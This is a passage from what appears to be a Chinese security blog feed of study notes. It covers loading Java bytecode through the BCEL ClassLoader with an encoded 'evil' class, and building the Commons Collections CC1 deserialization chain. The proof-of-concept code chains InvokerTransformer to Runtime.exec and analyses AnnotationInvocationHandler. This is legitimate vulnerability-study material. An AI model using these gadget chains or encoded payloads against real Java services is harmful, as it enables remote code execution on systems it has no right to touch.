[]args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//encode();</span><br>        decode();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass<br>                (<span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMK$c3$40$Q$7d$db$af41$b5$b5$b5$f5$5b$5bOU$c4$5c$E$P$V$_$82x$I$wT$ea$c1$d3$b6$5d$ea$96M$oiZ$f0g$e9A$c1$83$3f$c0$l$r$cen$LA$e8$k$e61of$de$be$d9$fd$f9$fd$fa$Gp$86C$H$F$ac$db$a8$a3Q$c4$86$83MlY$d8$b6$b0$c3P$b8$90$a1L$$$Z$b2$ed$a3$kC$ee$w$g$K$86$b2$_Cq$3b$N$fa$o$7e$e0$7dEL$d5$8f$G$5c$f5x$yu$be$ms$c9$b3$9c0$b8$be$98I$e5$dd$I$a5$a2$O$b1$B$97$nC$a3$fd$e4$8f$f9$8c$7b$8a$87$p$af$9b$c42$iu$cc$j$3c$k$d1T&quot;</span> +                <span class="hljs-string">&quot;mI$99$c1$e9F$d3x$m$ae$a5$d6w$8c$e4$a9nsa$a1ha$d7$c5$k$f6$ZJ$a6r$d2$7c$8cb5lY8p$d1D$8b$sR$t$&quot;</span> +              <span class="hljs-string">&quot;M$95T$ff$ae$3f$W$83$e4$l$d5$7d$9d$q$o$a0$c5$a3$v$V$eas32$f2$ee$c9IB$7e$E$P$c8Om$J$cd$60$bd$e8L$d1$96$f5$f6$b2$r$d1B$9e$9e$5c$9f$M$98$b6N$d1$a6$cc$pd$84$f9$e3O$b07Sv$u$W$M$99&quot;</span> +          <span class="hljs-string">&quot;$c5$KEw$de$40X$o$b4$b1$8a$f2b$f8$dc$88$R$f7$8eL5$fb$81$5c$w$e0$Q$ea$a1$oI$a5$o6$wX$p$a4$ef3$9d&quot;</span> + <span class="hljs-string">&quot;$b5$3f3$dbS$w$S$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011732779.png" alt="image-20240730011732779"></p><p><code>BCEL ClassLoader</code>åœ¨<code>Fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨é“¾æ„é€ æ—¶éƒ½æœ‰è¢«ç”¨åˆ°ï¼Œå…¶å®è¿™ä¸ªç±»å’Œå‰é¢çš„ <code>TemplatesImpl</code> éƒ½å‡ºè‡ªäºåŒä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œ<code>Apache Xalan</code>ã€‚</p><p>ä½†æ˜¯ç”±äºå„ç§åŸå› ï¼ˆè¯¦è§å‰é¢æ‰€è¯´çš„ ã€ŠBCEL ClassLoader å»å“ªäº†ã€‹ï¼‰ï¼Œåœ¨<strong>Java <code>8u251</code>çš„æ›´æ–°ä¸­ï¼Œè¿™ä¸ªClassLoaderè¢«ç§»é™¤äº†</strong>ï¼Œæ‰€ä»¥æˆ‘JDK8u401çš„ç‰ˆæœ¬æ˜¯ä¼šæŠ¥é”™çš„ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011841209.png" alt="image-20240730011841209"></p><p>ä½†æ˜¯è¿™ç§ä½¿ç”¨<code>Repository.lookupClass()</code>çš„æ–¹æ³•å¾ˆå¸¸ç”¨ï¼Œç»å¸¸ç”¨äºæ‰“å…¥æ¶æ„å­—èŠ‚ç ï¼Œåç»­é‡åˆ°å…·ä½“é¢˜ç›®çš„æ—¶å€™å°±çŸ¥é“äº†ã€‚æ‰“å¤ç°çš„æ—¶å€™è¿™å‡ ä¸ªåŠ è½½å­—èŠ‚ç çš„æ–¹å¼éƒ½å¯èƒ½ä¼šå‡ºç°ã€‚</p><p>å‚è€ƒï¼š</p><p>pç‰›-Javaå®‰å…¨æ¼«è°ˆ - 13.Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•</p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">çŸ¥è¯†æ˜Ÿçƒ | æ·±åº¦è¿æ¥é“æ†ç²‰ä¸ï¼Œè¿è¥é«˜å“è´¨ç¤¾ç¾¤ï¼ŒçŸ¥è¯†å˜ç°çš„å·¥å…· (zsxq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Commons Collections</title>
    <link href="/2024/07/28/Commons-Collections/"/>
    <url>/2024/07/28/Commons-Collections/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å½“åˆå­¦Javaååºåˆ—åŒ–æœ€å…ˆé‡åˆ°çš„ï¼Œè¿™ä¹Ÿæ˜¯ç»•ä¸å¼€çš„ä¸œè¥¿ã€‚è™½ç„¶ç°åœ¨å¯¹äºå¾ˆå¤šJavaååºåˆ—åŒ–é¢˜å·²ç»ä¸èƒ½ç›´æ¥å¥—ç”¨CCé“¾é€Ÿé€šï¼Œä½†æ˜¯å¾ˆå¤šç¼åˆæ€ªè°ƒè¯•åˆ°æœ€åä¸€æ­¥è¿˜æ˜¯é‡‡ç”¨çš„CCé“¾éƒ¨åˆ†ï¼Œå› ä¸ºåŸç”Ÿååºåˆ—åŒ–è‚¯å®šæ˜¯å¾ˆå¥½ç”¨çš„ã€‚</p><p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹å‡ ä¸ªå…³é”®è¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">å¯¹äºåˆ©ç”¨é“¾ä¸Šçš„ç±»ï¼Œéƒ½éœ€è¦å®ç°Serializableæ¥å£ã€æˆ–ç»§æ‰¿è¯¥æ¥å£çš„å®ç°ç±»<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Sourceï¼šå…¥å£ç±»ï¼ˆé‡å†™readObjectè°ƒç”¨å¸¸è§æ–¹æ³•ï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½jdkè‡ªå¸¦ï¼‰<br>Gadget Chainï¼šè°ƒç”¨é“¾ï¼ˆç›¸åŒæ–¹æ³•åã€ç›¸åŒå‚æ•°ç±»å‹ã€ä¸åŒè°ƒç”¨è¿‡ç¨‹ï¼‰<br>Sinkï¼šæ‰§è¡Œç±»ï¼ˆRCEã€SSRFã€å†™æ–‡ä»¶...ï¼‰<br></code></pre></td></tr></table></figure><p>å¸¸è§æ–¹æ³•ï¼š<code>toString</code>ã€<code>hashCode</code>ã€<code>equals</code></p><p>åœ¨åé¢çš„CCé“¾ä¸­ç»å¸¸çœ‹åˆ°<code>HashMap</code>ä½œä¸ºå…¥å£ç±»ï¼Œå®ƒå®ç°äº†<code>Serializable</code>æ¥å£ä¸”ä½œä¸ºjdkè‡ªå¸¦çš„ç±»ï¼Œ<code>readObject</code>ä¸­è°ƒç”¨äº†å¸¸è§æ–¹æ³•<code>hashCode</code>ï¼Œæ˜¯ä¸é”™çš„å…¥å£ç±»ã€‚</p><p>ä¸¥æ ¼æ¥è¯´åº”è¯¥ä»URLDNSå¼€å§‹å†™ï¼Œä½†æ˜¯åŸç†ä¹Ÿå¾ˆç®€å•å¾ˆæ˜“æ‡‚ï¼Œåªæ¶‰åŠURLç±»é‡Œhashcodeé‡Œçš„ç®€å•æ“ä½œè§¦å‘è®¿é—®DNSï¼ˆå…¶å®æ˜¯æˆ‘æ‡’ï¼‰ï¼Œå°±ä¸å†™äº†ã€‚</p><p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥å›åˆ°æˆ‘ä»¬æ¢¦å¼€å§‹çš„åœ°æ–¹-<strong>Commons Collections</strong>ã€‚</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>CC1å…¶å®ç”¨çš„ä¸å¤šï¼ŒCCé“¾é‡Œç”¨å¾—é¢‘ç¹çš„å…¶å®æ˜¯CC3ï¼ˆæ¶æ„å­—èŠ‚ç ï¼‰ã€CC6ä»¥åŠCC4ï¼Œè¿˜æœ‰å¾ˆå°‘è§çš„CC2ï¼ŒCC1å…¶å®å°±æ˜¯èµ·åˆ°ä¸€ä¸ªå¼•å…¥å­¦ä¹ çš„ä½œç”¨ã€‚</p><p>é¦–å…ˆä¾èµ–å°±ç›´æ¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>Jdk8u401</code>ã€‚</p><p>è¿™å‡ ä¸ªMapéƒ½å°¤ä¸ºç»å…¸ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ ã€‚</p><p><strong>Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥æ¥å—ä»»æ„ä¸€ä¸ª<code>Object</code>ç±»å‹çš„å‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªæ¥å£æœ‰å‡ ä¸ªé‡è¦çš„Mapå®ç°ç±»ï¼Œè€Œä¸”å®ƒä»¬éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ã€‚</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>ConstantTransformer</code>è°ƒç”¨<code>transform()</code>æ–¹æ³•è¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¯¹è±¡</p><p>å†™ä¸€å †ç©æ„å…¶å®å°±æ˜¯ä¼ å…¥ä¼ å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œå‰åä¸å˜ã€‚</p><p><strong>InvokerTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125; <span class="hljs-comment">// catch ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ¯”è¾ƒå…³é”®äº†ï¼Œæ˜¯ååºåˆ—åŒ–åˆ©ç”¨çš„å¸¸å®¢ã€‚å› ä¸ºå®ƒè¿™é‡Œçš„invokeå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚</p><ul><li>iMethodName å¾…æ‰§è¡Œçš„æ–¹æ³•å</li><li>iParamTypes å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</li><li>iArgs å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨</li></ul><p>è°ƒç”¨<code>transform</code>çš„æ—¶å€™ä¼šæ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚</p><p><strong>ChainedTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸€å †ï¼Œå…¶å®å°±æ˜¯æŠŠå¤šä¸ª<code>Transformer</code>ä¸²æˆä¸€æ¡é“¾å­ï¼Œå‰ä¸€ä¸ªè°ƒç”¨è¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªè°ƒç”¨çš„å‚æ•°ã€‚</p><p><strong>TransformedMap</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TransformedMap</code>ç”¨äºå¯¹JavaåŸç”ŸMapè¿›è¡Œä¸€äº›ä¿®é¥°ï¼Œå½“Mapè°ƒç”¨<code>setValue</code>æ—¶ï¼Œä¼šè§¦å‘<code>checkSetValue</code>ï¼Œè¿›è€Œè°ƒç”¨<code>transform</code>ã€‚å…¶æ„é€ æ–¹æ³•è¢«<code>protected</code>ä¿®é¥°ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨å®ƒçš„é™æ€publicæ–¹æ³•<code>decorate</code></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯ä½¿ç”¨<code>Transformer</code>çš„å®ç°ç±»å’Œ<code>TransformedMap</code>å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¿©é—®é¢˜ï¼š</p><ul><li>Runtimeç±»æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•ååºåˆ—åŒ–</li><li>éœ€è¦æ‰¾åˆ°<code>readObject</code>ä¸­æœ‰ç±»ä¼¼<code>Map.put(xxx,yyy)</code>æ“ä½œçš„ç±»</li></ul><p>å¯¹äºé—®é¢˜ä¸€ï¼Œ<code>Class</code>ç±»å¯ä»¥ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨<code>Runtime.class</code>ä½œä¸º<code>ChainedTransformer</code>çš„å…¥å£å‚æ•°ï¼Œåé¢å†é€šè¿‡åå°„æ¥è°ƒç”¨exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>å¯¹äºé—®é¢˜äºŒï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå®Œç¾å®Œæˆä»»åŠ¡çš„ç±»ï¼š<strong>AnnotationInvocationHandler</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.reflect.annotation.AnnotationInvocationHandler#readObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> &#123;<br>    s.defaultReadObject();<br><br>    <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>    <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        annotationType = AnnotationType.getInstance(type);<br>    &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>        <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>    &#125;<br><br>    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>    <span class="hljs-comment">// If there are annotation members without values, that</span><br>    <span class="hljs-comment">// situation is handled by the invoke method.</span><br>    <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>        Class&lt;?&gt; memberType = memberTypes.get(name);<br>        <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>            <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>            <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                  value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                memberValue.setValue(<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                        value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                        annotationType.members().get(name)));<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®¡ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue =ã€‹<br>TransformedMap#checkSetValue =ã€‹ <br>valueTransformer.transform()<br></code></pre></td></tr></table></figure><p>checkSetValueä¼šå› ä¸ºMapè°ƒç”¨setValueæ–¹æ³•è€Œè°ƒç”¨checkSetValueæ–¹æ³•ï¼›</p><p>å› æ­¤è®©<code>memberValue</code>ä¸ºä¸Šé¢çš„evilMapå³å¯ã€‚</p><p>ä½†æ€ä¹ˆè§¦å‘åˆ°è¿™ä¸ªsetValueå‘¢ï¼Ÿ</p><p>åˆ¤æ–­æ¡ä»¶åœ¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt; memberType = memberTypes.get(name);<br></code></pre></td></tr></table></figure><p>å®ƒéœ€è¦æ»¡è¶³<code>memberType != null</code>æ‰èƒ½è¿›å…¥<code>memberValue.setValue</code></p><p>ç»§ç»­è·Ÿè¿›ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br></code></pre></td></tr></table></figure><p>å†åˆ°annotationTypeï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">annotationType = AnnotationType.getInstance(type);<br></code></pre></td></tr></table></figure><p>æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title 